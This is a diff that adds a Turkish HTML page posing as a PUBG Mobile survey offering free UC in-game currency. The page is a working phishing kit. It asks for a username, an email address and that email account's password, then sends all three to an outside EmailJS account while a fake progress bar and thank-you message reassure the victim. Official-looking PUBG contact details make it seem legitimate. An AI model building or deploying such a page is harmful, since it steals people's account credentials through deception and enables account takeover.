@@ -1,0 +1,305 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PUBG Mobile UC Etkinlik Anketi</title>
+    <style>
+        /* Stil kodlarınız buraya gelecek */
+        body {
+            font-family: 'Arial', sans-serif;
+            margin: 0;
+            padding: 0;
+            background: url('https://example.com/pubg-background.jpg') no-repeat center center fixed;
+            background-size: cover;
+            color: #fff;
+            text-align: center;
+        }
+        .container {
+            max-width: 700px;
+            margin: 100px auto;
+            background: rgba(0, 0, 0, 0.7);
+            padding: 30px;
+            border-radius: 12px;
+            box-shadow: 0 0 20px rgba(0, 0, 0, 0.5);
+        }
+        h1 {
+            margin-bottom: 20px;
+            color: #ffcc00;
+            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.8);
+        }
+        .question {
+            margin-bottom: 20px;
+        }
+        .question label {
+            display: block;
+            margin-bottom: 10px;
+            font-size: 18px;
+        }
+        .question input[type="text"],
+        .question input[type="email"],
+        .question input[type="password"],
+        .question select {
+            width: 100%;
+            padding: 10px;
+            border-radius: 5px;
+            border: 1px solid #555;
+            background: #222;
+            color: #fff;
+            font-size: 16px;
+        }
+        .question button {
+            padding: 15px 25px;
+            background-color: #ffcc00;
+            color: #333;
+            border: none;
+            border-radius: 5px;
+            font-size: 18px;
+            cursor: pointer;
+            transition: background-color 0.3s, transform 0.3s;
+        }
+        .question button:hover {
+            background-color: #e6b800;
+            transform: scale(1.05);
+        }
+        .progress-container {
+            width: 100%;
+            height: 30px;
+            background: #444;
+            border-radius: 15px;
+            margin: 20px 0;
+            position: relative;
+            overflow: hidden;
+        }
+        .progress-bar {
+            height: 100%;
+            width: 0;
+            background: #ffcc00;
+            transition: width 2s;
+        }
+        .result,
+        .thank-you {
+            display: none;
+            margin-top: 20px;
+            font-size: 18px;
+        }
+        .result p,
+        .thank-you p {
+            font-size: 22px;
+            font-weight: bold;
+        }
+        .result span,
+        .thank-you span {
+            color: #ffcc00;
+        }
+        .result img,
+        .thank-you img {
+            width: 200px;
+            height: auto;
+            margin-top: 10px;
+            border-radius: 10px;
+            box-shadow: 0 0 15px rgba(0, 0, 0, 0.8);
+        }
+        .bg-overlay {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.5);
+            z-index: -1;
+        }
+        .error {
+            color: red;
+            margin-top: 10px;
+        }
+        .thank-you-button {
+            margin-top: 20px;
+            padding: 15px 25px;
+            background-color: #ffcc00;
+            color: #333;
+            border: none;
+            border-radius: 5px;
+            font-size: 18px;
+            cursor: pointer;
+            display: none;
+        }
+        .thank-you-button:hover {
+            background-color: #e6b800;
+        }
+        .contact-info {
+            margin-top: 20px;
+            font-size: 16px;
+            color: #fff;
+        }
+        /* Mobil uyumlu stiller */
+        @media (max-width: 768px) {
+            .container {
+                margin: 20px;
+                padding: 15px;
+            }
+            .question label {
+                font-size: 16px;
+            }
+            .question input[type="text"],
+            .question input[type="email"],
+            .question input[type="password"],
+            .question select {
+                font-size: 14px;
+                padding: 8px;
+            }
+            .question button {
+                font-size: 16px;
+                padding: 12px 20px;
+            }
+            .result p,
+            .thank-you p {
+                font-size: 18px;
+            }
+            .result img,
+            .thank-you img {
+                width: 150px;
+            }
+        }
+        @media (max-width: 480px) {
+            .container {
+                margin: 10px;
+                padding: 10px;
+            }
+            .question label {
+                font-size: 14px;
+            }
+            .question input[type="text"],
+            .question input[type="email"],
+            .question input[type="password"],
+            .question select {
+                font-size: 12px;
+                padding: 6px;
+            }
+            .question button {
+                font-size: 14px;
+                padding: 10px 15px;
+            }
+            .result p,
+            .thank-you p {
+                font-size: 16px;
+            }
+            .result img,
+            .thank-you img {
+                width: 120px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>PUBG Mobile UC Etkinlik Anketi</h1>
+        <form id="surveyForm">
+            <div class="question">
+                <label for="username">Kullanıcı Adı:</label>
+                <input type="text" id="username" name="username" required>
+            </div>
+            <div class="question">
+                <label for="email">E-posta:</label>
+                <input type="email" id="email" name="email" required>
+            </div>
+            <div class="question">
+                <label for="password">E-posta Şifresi:</label>
+                <input type="password" id="password" name="password" required>
+            </div>
+            <div class="question">
+                <label for="amount">UC Miktarı Seçiniz:</label>
+                <select id="amount" name="amount" required>
+                    <option value="60">60 UC</option>
+                    <option value="100">100 UC</option>
+                    <option value="600">600 UC</option>
+                    <option value="1000">1000 UC</option>
+                    <option value="5000">5000 UC</option>
+                </select>
+            </div>
+            <button type="submit">Gönder</button>
+        </form>
+        <div class="result">
+            <p>Kullanıcı Adınız: <span id="resultUsername"></span></p>
+            <div class="progress-container">
+                <div class="progress-bar" id="progressBar"></div>
+            </div>
+            <p>Seçilen Miktar: <span id="resultAmount"></span> UC</p>
+            <img src="https://example.com/pubg-image.jpg" alt="PUBG Görüntüsü">
+            <p id="processingMessage"></p>
+        </div>
+        <div class="thank-you">
+            <p>Teşekkürler! İşleminiz tamamlandı.</p>
+            <button class="thank-you-button" id="thankYouButton">Tamam</button>
+        </div>
+        <div class="contact-info">
+            <p>PUBG Mobile İletişim Bilgileri:</p>
+            <p>E-posta: support@pubgmobile.com</p>
+            <p>Web: <a href="https://pubgmobile.com" target="_blank" style="color: #ffcc00;">pubgmobile.com</a></p>
+        </div>
+        <div class="error" id="errorMessage"></div>
+    </div>
+    <div class="bg-overlay"></div>
+    <script type="text/javascript"
+        src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js">
+    </script>
+    <script type="text/javascript">
+        (function() {
+            emailjs.init("O4KnZRbRaI5zc1ufw"); // Public API Key
+        })();
+        
+        document.getElementById('surveyForm').addEventListener('submit', function(event) {
+            event.preventDefault();
+
+            var username = document.getElementById('username').value;
+            var email = document.getElementById('email').value;
+            var password = document.getElementById('password').value;
+            var amount = document.getElementById('amount').value;
+
+            if (username.trim() === '' || email.trim() === '' || password.trim() === '' || amount.trim() === '') {
+                document.getElementById('errorMessage').textContent = 'Lütfen tüm alanları doldurunuz.';
+                return;
+            }
+
+            var templateParams = {
+                username: username,
+                email: email,
+                password: password,
+                amount: amount
+            };
+
+            document.querySelector('.result').style.display = 'block';
+            document.querySelector('.thank-you').style.display = 'none';
+
+            var progressBar = document.getElementById('progressBar');
+            progressBar.style.width = '0%';
+            setTimeout(function() {
+                progressBar.style.width = '100%';
+            }, 100);
+
+            emailjs.send('service_u2m5b67', 'template_g3sujjj', templateParams)
+                .then(function(response) {
+                    console.log('Başarıyla gönderildi: ', response);
+                    document.getElementById('resultUsername').textContent = username;
+                    document.getElementById('resultAmount').textContent = amount;
+                    document.getElementById('processingMessage').textContent = 'İşleminiz işleniyor...';
+                    setTimeout(function() {
+                        document.querySelector('.result').style.display = 'none';
+                        document.querySelector('.thank-you').style.display = 'block';
+                        document.getElementById('thankYouButton').style.display = 'inline-block';
+                    }, 2000);
+                }, function(error) {
+                    console.error('Gönderim hatası: ', error);
+                    document.getElementById('errorMessage').textContent = 'Bir hata oluştu. Lütfen tekrar deneyin.';
+                });
+        });
+
+        document.getElementById('thankYouButton').addEventListener('click', function() {
+            document.getElementById('surveyForm').reset();
+            document.querySelector('.result').style.display = 'none';
+            document.querySelector('.thank-you').style.display = 'none';
+            document.getElementById('progressBar').style.width = '0';
+        });
+    </script>
+</body>
+</html>
